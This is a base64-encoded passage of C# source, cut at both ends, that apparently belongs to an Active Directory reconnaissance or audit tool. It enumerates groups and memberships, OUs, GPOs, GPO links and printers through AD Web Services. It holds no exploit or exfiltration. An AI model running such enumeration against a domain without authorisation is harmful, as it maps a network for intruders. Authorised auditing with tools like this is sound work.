AgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gUHJpbWFyeUdyb3VwSUQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwTWVtYmVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdyb3VwIE5hbWUiLCBHcm91cE5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIFVzZXJOYW1lIiwgTWVtYmVyVXNlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIE5hbWUiLCBNZW1iZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkFjY291bnRUeXBlIiwgQWNjb3VudFR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3Vwc0xpc3QuQWRkKCBHcm91cE1lbWJlck9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbiBNZW1iZXJHcm91cHMgPSAoTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24pQWRHcm91cC5NZW1iZXJzWyJtZW1iZXJvZiJdLlZhbHVlOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoTWVtYmVyR3JvdXBzLlZhbHVlICE9IG51bGwpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChNZW1iZXJHcm91cHMuVmFsdWUgaXMgU3lzdGVtLlN0cmluZ1tdKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBHcm91cE1lbWJlciBpbiAoU3lzdGVtLlN0cmluZ1tdKU1lbWJlckdyb3Vwcy5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhHcm91cE1lbWJlcikpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwTWVtYmVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXAgTmFtZSIsIEdyb3VwTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlciBVc2VyTmFtZSIsIE1lbWJlclVzZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIE5hbWUiLCBNZW1iZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudFR5cGUiLCBBY2NvdW50VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cHNMaXN0LkFkZCggR3JvdXBNZW1iZXJPYmogKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gKENvbnZlcnQuVG9TdHJpbmcoTWVtYmVyR3JvdXBzLlZhbHVlKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwTWVtYmVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHcm91cCBOYW1lIiwgR3JvdXBOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgVXNlck5hbWUiLCBNZW1iZXJVc2VyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIE5hbWUiLCBNZW1iZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY2NvdW50VHlwZSIsIEFjY291bnRUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBzTGlzdC5BZGQoIEdyb3VwTWVtYmVyT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKFRydXN0QWNjb3VudHMuQ29udGFpbnMoU2FtQWNjb3VudFR5cGUpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gVE8gRE8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEdyb3Vwc0xpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBPVVJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRPVSA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IE9VT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgT1VPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRPVS5NZW1iZXJzWyJOYW1lIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBPVU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlcHRoIiwgKChDb252ZXJ0LlRvU3RyaW5nKEFkT1UuTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkuU3BsaXQobmV3IHN0cmluZ1tdIHsgIk9VPSIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpKS5MZW5ndGggLTEpKSk7CiAgICAgICAgICAgICAgICAgICAgT1VPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZXNjcmlwdGlvbiIsIEFkT1UuTWVtYmVyc1siRGVzY3JpcHRpb24iXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIE9VT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNyZWF0ZWQiLCBBZE9VLk1lbWJlcnNbIndoZW5DcmVhdGVkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBPVU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DaGFuZ2VkIiwgQWRPVS5NZW1iZXJzWyJ3aGVuQ2hhbmdlZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgT1VPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIEFkT1UuTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IE9VT2JqIH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIEdQT1JlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgQWRHUE8gPSAoUFNPYmplY3QpIHJlY29yZDsKCiAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR1BPT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgR1BPT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGlzcGxheU5hbWUiLCBDbGVhblN0cmluZyhBZEdQTy5NZW1iZXJzWyJEaXNwbGF5TmFtZSJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIEdQT09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdVSUQiLCBDbGVhblN0cmluZyhBZEdQTy5NZW1iZXJzWyJOYW1lIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgR1BPT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNyZWF0ZWQiLCBBZEdQTy5NZW1iZXJzWyJ3aGVuQ3JlYXRlZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgR1BPT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNoYW5nZWQiLCBBZEdQTy5NZW1iZXJzWyJ3aGVuQ2hhbmdlZCJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgR1BPT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGlzdGluZ3Vpc2hlZE5hbWUiLCBDbGVhblN0cmluZyhBZEdQTy5NZW1iZXJzWyJEaXN0aW5ndWlzaGVkTmFtZSJdLlZhbHVlKSkpOwogICAgICAgICAgICAgICAgICAgIEdQT09iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkZpbGVQYXRoIiwgQWRHUE8uTWVtYmVyc1siZ1BDRmlsZVN5c1BhdGgiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IEdQT09iaiB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBHUE9SZWNvcmREaWN0aW9uYXJ5UHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBBZEdQTyA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIEFEV1NDbGFzcy5BZEdQT0RpY3Rpb25hcnkuQWRkKChDb252ZXJ0LlRvU3RyaW5nKEFkR1BPLk1lbWJlcnNbIkRpc3Rpbmd1aXNoZWROYW1lIl0uVmFsdWUpLlRvVXBwZXIoKSksIChDb252ZXJ0LlRvU3RyaW5nKEFkR1BPLk1lbWJlcnNbIkRpc3BsYXlOYW1lIl0uVmFsdWUpKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgU09NUmVjb3JkUHJvY2Vzc29yIDogSVJlY29yZFByb2Nlc3NvcgogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIFBTT2JqZWN0W10gcHJvY2Vzc1JlY29yZChPYmplY3QgcmVjb3JkKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBBZFNPTSA9IChQU09iamVjdCkgcmVjb3JkOwogICAgICAgICAgICAgICAgICAgIExpc3Q8UFNPYmplY3Q+IFNPTXNMaXN0ID0gbmV3IExpc3Q8UFNPYmplY3Q+KCk7CiAgICAgICAgICAgICAgICAgICAgaW50IERlcHRoID0gMDsKICAgICAgICAgICAgICAgICAgICBib29sIEJsb2NrSW5oZXJpdGFuY2UgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBib29sPyBMaW5rRW5hYmxlZCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gRW5mb3JjZWQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIFN0cmluZyBnUExpbmsgPSBDb252ZXJ0LlRvU3RyaW5nKEFkU09NLk1lbWJlcnNbImdQTGluayJdLlZhbHVlKTsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgR1BPTmFtZSA9IG51bGw7CgogICAgICAgICAgICAgICAgICAgIERlcHRoID0gKENvbnZlcnQuVG9TdHJpbmcoQWRTT00uTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkuU3BsaXQobmV3IHN0cmluZ1tdIHsgIk9VPSIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpKS5MZW5ndGggLTE7CiAgICAgICAgICAgICAgICAgICAgaWYgKEFkU09NLk1lbWJlcnNbImdQT3B0aW9ucyJdLlZhbHVlICE9IG51bGwgJiYgKGludCkgQWRTT00uTWVtYmVyc1siZ1BPcHRpb25zIl0uVmFsdWUgPT0gMSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEJsb2NrSW5oZXJpdGFuY2UgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB2YXIgR1BMaW5rcyA9IGdQTGluay5TcGxpdCgnXScsICdbJykuV2hlcmUoeCA9PiB4LlN0YXJ0c1dpdGgoIkxEQVAiKSk7CiAgICAgICAgICAgICAgICAgICAgaW50IE9yZGVyID0gKEdQTGlua3MuVG9BcnJheSgpKS5MZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgaWYgKE9yZGVyID09IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBTT01PYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTmFtZSIsIEFkU09NLk1lbWJlcnNbIk5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZXB0aCIsIERlcHRoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRpc3Rpbmd1aXNoZWROYW1lIiwgQWRTT00uTWVtYmVyc1siRGlzdGluZ3Vpc2hlZE5hbWUiXS5WYWx1ZSkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJMaW5rIE9yZGVyIiwgbnVsbCkpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHUE8iLCBHUE9OYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkVuZm9yY2VkIiwgRW5mb3JjZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTGluayBFbmFibGVkIiwgTGlua0VuYWJsZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQmxvY2tJbmhlcml0YW5jZSIsIEJsb2NrSW5oZXJpdGFuY2UpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiZ1BMaW5rIiwgZ1BMaW5rKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoImdQT3B0aW9ucyIsIEFkU09NLk1lbWJlcnNbImdQT3B0aW9ucyJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTXNMaXN0LkFkZCggU09NT2JqICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBsaW5rIGluIEdQTGlua3MpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmdbXSBsaW5rc3BsaXQgPSBsaW5rLlNwbGl0KCcvJywgJzsnKTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFDb252ZXJ0LlRvQm9vbGVhbigoQ29udmVydC5Ub0ludDMyKGxpbmtzcGxpdFszXSkgJiAxKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExpbmtFbmFibGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExpbmtFbmFibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKENvbnZlcnQuVG9Cb29sZWFuKChDb252ZXJ0LlRvSW50MzIobGlua3NwbGl0WzNdKSAmIDIpKSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5mb3JjZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5mb3JjZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBHUE9OYW1lID0gQURXU0NsYXNzLkFkR1BPRGljdGlvbmFyeS5Db250YWluc0tleShsaW5rc3BsaXRbMl0uVG9VcHBlcigpKSA/IEFEV1NDbGFzcy5BZEdQT0RpY3Rpb25hcnlbbGlua3NwbGl0WzJdLlRvVXBwZXIoKV0gOiBsaW5rc3BsaXRbMl0uU3BsaXQoJz0nLCcsJylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IFNPTU9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRTT00uTWVtYmVyc1siTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlcHRoIiwgRGVwdGgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRGlzdGluZ3Vpc2hlZE5hbWUiLCBBZFNPTS5NZW1iZXJzWyJEaXN0aW5ndWlzaGVkTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkxpbmsgT3JkZXIiLCBPcmRlcikpOwogICAgICAgICAgICAgICAgICAgICAgICBTT01PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHUE8iLCBHUE9OYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkVuZm9yY2VkIiwgRW5mb3JjZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTGluayBFbmFibGVkIiwgTGlua0VuYWJsZWQpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQmxvY2tJbmhlcml0YW5jZSIsIEJsb2NrSW5oZXJpdGFuY2UpKTsKICAgICAgICAgICAgICAgICAgICAgICAgU09NT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiZ1BMaW5rIiwgZ1BMaW5rKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoImdQT3B0aW9ucyIsIEFkU09NLk1lbWJlcnNbImdQT3B0aW9ucyJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNPTXNMaXN0LkFkZCggU09NT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIE9yZGVyLS07CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBTT01zTGlzdC5Ub0FycmF5KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIFByaW50ZXJSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEFkUHJpbnRlciA9IChQU09iamVjdCkgcmVjb3JkOwoKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBQcmludGVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk5hbWUiLCBBZFByaW50ZXIuTWVtYmVyc1siTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNlcnZlck5hbWUiLCBBZFByaW50ZXIuTWVtYmVyc1sic2VydmVyTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlNoYXJlTmFtZSIsICgoTWljcm9zb2Z0LkFjdGl2ZURpcmVjdG9yeS5NYW5hZ2VtZW50LkFEUHJvcGVydHlWYWx1ZUNvbGxlY3Rpb24pIChBZFByaW50ZXIuTWVtYmVyc1sicHJpbnRTaGFyZU5hbWUiXS5WYWx1ZSkpLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRyaXZlck5hbWUiLCBBZFByaW50ZXIuTWVtYmVyc1siZHJpdmVyTmFtZSJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRyaXZlclZlcnNpb24iLCBBZFByaW50ZXIuTWVtYmVyc1siZHJpdmVyVmVyc2lvbiJdLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIlBvcnROYW1lIiwgKChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbikgKEFkUHJpbnRlci5NZW1iZXJzWyJwb3J0TmFtZSJdLlZhbHVlKSkuVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBQcmludGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiVVJMIiwgKChNaWNyb3NvZnQuQWN0aXZlRGlyZWN0b3J5Lk1hbmFnZW1lbnQuQURQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbikgKEFkUHJpbnRlci5NZW1iZXJzWyJ1cmwiXS5WYWx1ZSkpLlZhbHVlKSk7CiAgICAgICAgICAgICAgICAgICAgUHJpbnRlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DcmVhdGVkIiwgQWRQcmludGVyLk1lbWJlcnNbIndoZW5DcmVhdGVkIl0uVmFsdWUpKTsKICAgICAgICAgICAgICAgICAgICBQcmludGVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eS